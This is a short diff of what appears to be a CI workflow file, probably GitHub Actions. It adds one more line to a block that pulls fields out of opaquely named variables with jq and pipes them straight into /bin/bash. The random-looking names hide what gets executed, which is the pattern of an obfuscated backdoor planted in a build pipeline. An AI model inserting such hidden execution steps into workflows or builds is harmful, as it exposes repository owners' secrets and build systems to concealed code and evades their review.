@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$cwe65605" | jq -r .yzyvi0 | /bin/bash
           echo $avas4 | jq -r .fu8 | /bin/bash
           echo $ouft7 | jq -r .aox8 | /bin/bash
+          echo $v3 | jq -r .xa614 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
